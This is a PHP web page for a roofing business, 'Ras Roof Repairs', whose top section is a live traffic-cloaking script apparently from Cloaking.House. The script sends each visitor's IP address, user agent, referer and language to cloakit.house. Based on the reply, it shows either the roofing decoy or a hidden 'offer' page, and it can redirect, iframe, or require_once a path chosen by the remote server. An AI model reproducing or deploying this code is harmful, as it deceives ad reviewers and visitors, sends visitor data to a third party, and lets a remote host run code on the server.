<?php

    // Не рекомендуется вносить самостоятельно изменения в скрипт, так как любые последствия неработоспособности будут лежать на вас.
    // С уважением, Cloaking.House


    // It is not recommended to make changes to this script on your own, as any consequences of malfunction will be your responsibility.
    // Sincerely, Cloaking.House



    error_reporting(0);
    mb_internal_encoding('UTF-8');


    if (version_compare(PHP_VERSION, '7.2', '<')) {
        exit('PHP 7.2 or higher is required.');
    }

    
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $ip_headers = [
        'HTTP_CLIENT_IP', 
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_CF_CONNECTING_IP', 
        'HTTP_FORWARDED_FOR', 
        'HTTP_X_COMING_FROM', 
        'HTTP_COMING_FROM', 
        'HTTP_FORWARDED_FOR_IP', 
        'HTTP_X_REAL_IP'
    ];

    
    if ( ! empty($ip_headers)) {
        foreach($ip_headers AS $header)
        {
            if ( ! empty($_SERVER[$header])) {
                $ip_address = trim($_SERVER[$header]);
                break;
            }
        }
    }


    $request_data = [
        'label'         => '39ce45e4f48cb3585d9d1ff48fd31aef', 
        'user_agent'    => $_SERVER['HTTP_USER_AGENT'], 
        'referer'       => ! empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '', 
        'query'         => ! empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '', 
        'lang'          => ! empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '',
        'ip_address'    => $ip_address
    ];
        

    if (function_exists('curl_version')) {

        $request_data = http_build_query($request_data);
        $ch = curl_init('https://cloakit.house/api/v1/check');
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER  => TRUE,
            CURLOPT_CUSTOMREQUEST   => 'POST',
            CURLOPT_SSL_VERIFYPEER  => FALSE,
            CURLOPT_TIMEOUT         => 15,
            CURLOPT_POSTFIELDS      => $request_data
        ]);


        $result = curl_exec($ch);
        $info   = curl_getinfo($ch);
        curl_close($ch);


        if ( ! empty($info) && $info['http_code'] == 200) {
            $body = json_decode($result, TRUE);

            
            if ( ! empty($body['filter_type']) && $body['filter_type'] == 'subscription_expired') {
                exit('Your Subscription Expired.');
            }
           

            if ( ! empty($body['url_white_page']) && ! empty($body['url_offer_page'])) {

                // Options
                $сontext_options = ['ssl' => ['verify_peer' => FALSE, 'verify_peer_name' => FALSE], 'http' => ['header' => 'User-Agent: ' . $_SERVER['HTTP_USER_AGENT']]];
                
                // Offer Page
                if ($body['filter_page'] == 'offer') {
                    if ($body['mode_offer_page'] == 'loading') {
                        if (filter_var($body['url_offer_page'], FILTER_VALIDATE_URL)) {
                            echo str_replace('<head>', '<head><base href="' . $body['url_offer_page'] . '" />', file_get_contents($body['url_offer_page'], FALSE, stream_context_create($сontext_options)));
                        } elseif (file_exists($body['url_offer_page'])) {
                            if (pathinfo($body['url_offer_page'], PATHINFO_EXTENSION) == 'html') {
                                echo file_get_contents($body['url_offer_page'], FALSE, stream_context_create($сontext_options));
                            } else {
                                require_once($body['url_offer_page']);
                            }
                        } else {
                            exit('Offer Page Not Found.');
                        }
                    }

                    if ($body['mode_offer_page'] == 'redirect') {
                        header('Location: ' . $body['url_offer_page'], TRUE, 302);
                        exit(0);
                    }

                    if ($body['mode_offer_page'] == 'iframe') {
                        echo '<iframe src="' . $body['url_offer_page'] . '" width="100%" height="100%" align="left"></iframe> <style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; } </style>';
                    }
                }


                // White Page
                if ($body['filter_page'] == 'white') {
                    if ($body['mode_white_page'] == 'loading') {
                        if (filter_var($body['url_white_page'], FILTER_VALIDATE_URL)) {
                            echo str_replace('<head>', '<head><base href="' . $body['url_white_page'] . '" />', file_get_contents($body['url_white_page'], FALSE, stream_context_create($сontext_options)));
                        } elseif (file_exists($body['url_white_page'])) {
                            if (pathinfo($body['url_white_page'], PATHINFO_EXTENSION) == 'html') {
                                echo file_get_contents($body['url_white_page'], FALSE, stream_context_create($сontext_options));
                            } else {
                                require_once($body['url_white_page']);
                            }
                        } else {
                            exit('White Page Not Found.');
                        }
                    }

                    if ($body['mode_white_page'] == 'redirect') {
                        header('Location: ' . $body['url_white_page'], TRUE, 302);
                        exit(0);
                    }
                }
            } 
        } else {
            exit('Try again later.');
        }
    } else {
        exit('cURL is not supported on the hosting.');
    }


?>
<!DOCTYPE html>
<html lang="en">
<head>
      <!-- basic -->
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <!-- mobile metas -->
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta name="viewport" content="initial-scale=1, maximum-scale=1">
      <!-- site metas -->
      <title>Ras Roof Repairs</title>
      <meta name="keywords" content="">
      <meta name="description" content="">
      <meta name="author" content="">
      <!-- bootstrap css -->
      <link rel="stylesheet" href="css/bootstrap.min.css">
      <!-- style css -->
      <link rel="stylesheet" href="css/style.css">
      <!-- responsive-->
      <link rel="stylesheet" href="css/responsive.css">
      <!-- awesome fontfamily -->
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
      <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script><![endif]-->
   </head>
   <!-- body -->
   <body class="main-layout">
      <!-- loader  -->
      
      <!-- end loader -->
      <!-- header -->
  <header>
         <div class="header">
            <div class="container-fluid">
               <div class="row d_flex">
                  <div class=" col-md-2 col-sm-3 col logo_section">
                     <div class="full">
                        <div class="center-desk">
                           <div class="logo">
                              <a href="index.php"><h1 style="color: white;">Ras Roof Repairs</h1></a>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div class="col-md-8 col-sm-9">
                     <nav class="navigation navbar navbar-expand-md navbar-dark ">
                        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample04" aria-controls="navbarsExample04" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="navbar-toggler-icon"></span>
                        </button>
                        <div class="collapse navbar-collapse" id="navbarsExample04">
                           <ul class="navbar-nav mr-auto">
                              <li class="nav-item active">
                                 <a class="nav-link" href="index.php">Home</a>
                              </li>
                              <li class="nav-item">
                                 <a class="nav-link" href="about.php">About</a>
                              </li>
                              <li class="nav-item">
                                 <a class="nav-link" href="service.php">Services</a>
                              </li>
                              <li class="nav-item">
                                 <a class="nav-link" href="contact.php">Contact Us</a>
                              </li>
                           </ul>
                        </div>
                     </nav>
                  </div>
                  <div class="col-md-2 d_none">
                     <ul class="email text_align_right">
                        <li> <a href="Javascript:void(0)">  </a></li>
                        <li> <a href="Javascript:void(0)"> <i class="fa fa-search" style="cursor: pointer;" aria-hidden="true"> </i></a> </li>
                     </ul>
                  </div>
               </div>
            </div>
         </div>
      </header>
      <!-- end header -->
      <!-- start slider section -->
      <div id="top_section" class=" banner_main">
         <div class="container">
            <div class="row">
               <div class="col-md-12">
                  <div id="myCarousel" class="carousel slide" data-ride="carousel">
                     <ol class="carousel-indicators">
                        <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
                        <li data-target="#myCarousel" data-slide-to="1"></li>
                        <li data-target="#myCarousel" data-slide-to="2"></li>
                        <li data-target="#myCarousel" data-slide-to="3"></li>
                     </ol>
                     <div class="carousel-inner">
                        <div class="carousel-item active">
                           <div class="container-fluid">
                              <div class="carousel-caption relative">
                                 <div class="bluid">
                                    <h1>Welcome To  <br>Ras Roof Repair</h1>
                                    <p>With years of industry expertise, we pride ourselves on delivering exceptional solutions that ensure the longevity and integrity of your roofing
                                    </p>
                                    <a class="read_more" href="about.php">About Company </a><a class="read_more" href="contact.php">Contact </a>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="carousel-item">
                           <div class="container-fluid">
                              <div class="carousel-caption relative">
                                 <div class="bluid">
                                    <h1>Welcome To  <br>Ras Roof Repair</h1>
                                    <p>With years of industry expertise, we pride ourselves on delivering exceptional solutions that ensure the longevity and integrity of your roofing</p>
                                    <a class="read_more" href="about.php">About Company </a><a class="read_more" href="contact.php">Contact </a>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="carousel-item">
                           <div class="container-fluid">
                              <div class="carousel-caption relative">
                                 <div class="bluid">
                                    <h1>Welcome To  <br>Ras Roof Repair</h1>
                                    <p>With years of industry expertise, we pride ourselves on delivering exceptional solutions that ensure the longevity and integrity of your roofing</p>
                                    <a class="read_more" href="about.php">About Company </a><a class="read_more" href="contact.php">Contact </a>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="carousel-item">
                           <div class="container-fluid">
                              <div class="carousel-caption relative">
                                 <div class="bluid">
                                    <h1>Welcome To  <br>Ras Roof Repair</h1>
                                    <p>With years of industry expertise, we pride ourselves on delivering exceptional solutions that ensure the longevity and integrity of your roofing</p>
                                    <a class="read_more" href="about.php">About Company </a><a class="read_more" href="contact.php">Contact </a>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <a class="carousel-control-prev" href="#myCarousel" role="button" data-slide="prev">
                     <i class="fa fa-angle-left" aria-hidden="true"></i>
                     <span class="sr-only">Previous</span>
                     </a>
                     <a class="carousel-control-next" href="#myCarousel" role="button" data-slide="next">
                     <i class="fa fa-angle-right" aria-hidden="true"></i>
                     <span class="sr-only">Next</span>
                     </a>
                  </div>
               </div>
            </div>
         </div>
      </div>
     <!-- end slider section -->
 
     <!-- about -->
             <div class="container-fluid">
               <div class="container">
                  <div class="row">
                     <div class="col-md-12">
                        <div class="text_align_center">
                           <h1 style="color: rgb(0, 0, 0);">About Company</h1>
                           <h3 style="color: rgb(0, 13, 255);">Welcome To Ras Roof Repairs</h3>
                           <p style="color: rgb(76, 85, 85) ;">RAS Roof Repairs is your trusted partner for top-tier roof maintenance and restoration services. With years of industry expertise, we pride ourselves on delivering exceptional solutions that ensure the longevity and integrity of your roofing. Our skilled team specializes in a wide array of repair techniques, catering to diverse roofing types. Whether it's fixing leaks, addressing damages, or enhancing insulation, we are committed to providing efficient, reliable, and cost-effective services. Choose RAS Roof Repairs to safeguard your investment and maintain a secure, weather-resistant shelter for years to come.</p>
                        </div>
                     </div>
                    
                  </div>
               </div>
            </div>
     <!-- end about -->

      <!-- we_do -->
      <div class="we_do">
         <div class="container">
            <div class="row">
               <div class="col-md-12">
                  <div class="titlepage text_align_center">
                     <h2>Our Services </h2>
                  </div>
               </div>
            </div>
            <div class="row">
               <div class="col-md-12">
                  <div id="we1" class="carousel slide" data-ride="carousel">
                     <ol class="carousel-indicators">
                        <li data-target="#we1" data-slide-to="0" class="active"></li>
                        <li data-target="#we1" data-slide-to="1"></li>
                        <li data-target="#we1" data-slide-to="2"></li>
                        <li data-target="#we1" data-slide-to="3"></li>
                     </ol>
                     <div class="carousel-inner">
                        <div class="carousel-item active">
                           <div class="container-fluid">
                              <div class="carousel-caption we1_do">
                                 <div class="row">
                                    <div class="col-md-4">
                                       <div id="bo_ho" class="we_box text_align_left">
                                          <i><img src="images/s.png" alt="#"/></i>
                                          <h3>Leak Detection and Repair</h3>
                                          <p> Our expert technicians employ advanced techniques to swiftly identify and repair leaks in your roof, preventing water damage and maintaining the structural integrity of your property.</p>
                                          <a class="read_more" href="service.php">Read More</a>
                                       </div>
                                    </div>
                                    <div class="col-md-4">
                                       <div id="bo_ho" class="we_box text_align_left">
                                          <i><img src="images/s.png" alt="#"/></i>
                                          <h3>Roof Restoration and Maintenance</h3>
                                          <p>We offer comprehensive roof restoration services that encompass cleaning, resealing, and repainting to enhance the appearance and functionality of your roof, prolonging its lifespan and protecting your investment.</p>
                                          <a class="read_more" href="service.php">Read More</a>
                                       </div>
                                    </div>
                                    <div class="col-md-4">
                                       <div id="bo_ho" class="we_box text_align_left">
                                          <i><img src="images/s.png" alt="#"/></i>
                                          <h3>Emergency Roof Repairs</h3>
                                          <p>Our dedicated team is available around the clock to address urgent roofing issues, such as storm damage or sudden leaks. Count on us to provide prompt and reliable emergency repairs to ensure your property remains safe and secure.</p>
                                          <a class="read_more" href="service.php">Read More</a>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                      </div>
                   </div>
                 </div>
              </div>
              </div>
      <!-- end we_do -->

      <!-- portfolio -->
     
      <!-- end portfolio -->
      <!-- chose -->
  
      <!-- end chose -->
      <!-- contact -->
      <div class="contact">
         <div class="container">
            <div class="row ">
               <div class="col-md-12">
                  <div class="titlepage text_align_left">
                     <h2>Get In Touch</h2>
                  </div>
                  <form id="request" class="main_form">
                     <div class="row">
                        <div class="col-md-12">
                           <input class="contactus" placeholder="Name" type="type" name=" Name"> 
                        </div>
                        <div class="col-md-12">
                           <input class="contactus" placeholder="Phone Number" type="type" name="Phone Number">                          
                        </div>
                        <div class="col-md-12">
                           <input class="contactus" placeholder="Email" type="type" name="Email">                          
                        </div>
                        <div class="col-md-12">
                           <textarea class="textarea" placeholder="Message" type="type" Message="Name"></textarea>
                        </div>
                        <div class="col-md-12">
                           <button class="send_btn">Send Now</button>
                        </div>
                     </div>
                  </form>
               </div>
            </div>
         </div>
      </div>
      <!-- contact -->
      <!-- footer -->
     <footer>
         <div class="footer">
            <div class="container">
               <div class="row">
                  <div class="col-md-3">
                     <a class="logo_footer" href="index.php"><img src="images/logo_footer.png" alt="#" /></a>
                  </div>
                  <div class="col-md-9">
                     <form class="newslatter_form">
                        <input class="ente" placeholder="Enter your email" type="text" name="Enter your email">
                        <button class="subs_btn">Sbscribe Now</button>
                     </form>
                  </div>
                  <div class="col-md-3 col-sm-6"
                  >
                     <div class="Informa helpful">
                        <h3>Useful  Link</h3>
                        <ul>
                           <li><a href="index.php">Home</a></li>
                           <li><a href="about.php">About</a></li>
                           <li><a href="service.php">Services</a></li>
                           <li><a href="privacy.php">Portfolio</a></li>
                           <li><a href="contact.php">Contact us</a></li>
                        </ul>
                     </div>
                  </div>
                  <div class="col-md-3 col-sm-6">
                     <div class="Informa">
                        <h3>Our Services</h3>
                        <ul>
                           <li><a href="service.php" style="color: white;">LEAK DETECTION AND REPAIR</a></li>
                           <li><a href="service.php" style="color: white;">ROOF RESTORATION AND MAINTENANCE</a></li>
                           <li><a href="service.php" style="color: white;">EMERGENCY ROOF REPAIRS</a></li>
                       </ul>
                     </div>
                  </div>
                  <div class="col-md-3 col-sm-6">
                     <div class="Informa">
                        <h3>Our Services</h3>
                        <ul>
                           <p style="color: white;">RAS Roof Repairs is your trusted partner for top-tier roof maintenance and restoration services.  </p></ul>
                     </div>
                  </div>
                  <div class="col-md-3 col-sm-6">
                     <div class="Informa conta">
                        <h3>contact Us</h3>
                        <ul>
                           <li> <a href="Javascript:void(0)"> <i class="fa fa-map-marker" aria-hidden="true"></i> 199 State 55 Rte
                              Napanoch, New York
                              </a>
                           </li>
                           <li> <a href="Javascript:void(0)"><i class="fa fa-phone" aria-hidden="true"></i> Call +(845) 210-4045
                              </a>
                           </li>
                           <li> <a href="Javascript:void(0)"> <i class="fa fa-envelope" aria-hidden="true"></i> rasroofrepairs@gmail.com
                              </a>
                           </li>
                        </ul>
                     </div>
                  </div>
               </div>
            </div>
            <div class="copyright text_align_left">
               <div class="container">
                  <div class="row d_flex">
                     <div class="col-md-6">
                        <p>© 2020 All Rights Reserved.  <a href="./index.php">Ras Roof Repairs</a></p>
                     </div>
                     <div class="col-md-6">
                        <ul class="social_icon text_align_center">
                           <li> <a href="Javascript:void(0)"><i class="fa fa-facebook-f"></i></a></li>
                           <li> <a href="Javascript:void(0)"><i class="fa fa-twitter"></i></a></li>
                           <li> <a href="Javascript:void(0)"><i class="fa fa-linkedin-square" aria-hidden="true"></i></a></li>
                           <li> <a href="Javascript:void(0)"><i class="fa fa-instagram" aria-hidden="true"></i></a></li>
                           <li> <a href="Javascript:void(0)"><i class="fa fa-youtube-play" aria-hidden="true"></i></a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </footer>
      <!-- end footer -->
      <!-- Javascript files-->
      <script src="js/jquery.min.js"></script>
      <script src="js/bootstrap.bundle.min.js"></script>
      <script src="js/jquery-3.0.0.min.js"></script>
      <script src="js/custom.js"></script>
   </body>
</html>
